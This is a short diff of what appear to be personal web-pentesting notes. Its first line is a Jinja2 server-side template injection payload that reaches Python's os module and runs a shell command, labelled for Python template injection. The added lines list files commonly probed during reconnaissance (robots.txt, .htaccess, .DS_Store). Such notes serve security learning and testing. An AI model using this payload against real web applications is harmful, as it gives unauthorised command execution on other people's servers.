@@ -1,1 +1,5 @@
 {{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }} - for python jinga sst1 
+
+keep Google from indexing website : robots.txt
+apache : /.htaccess
+stored on mac : .DS_Store
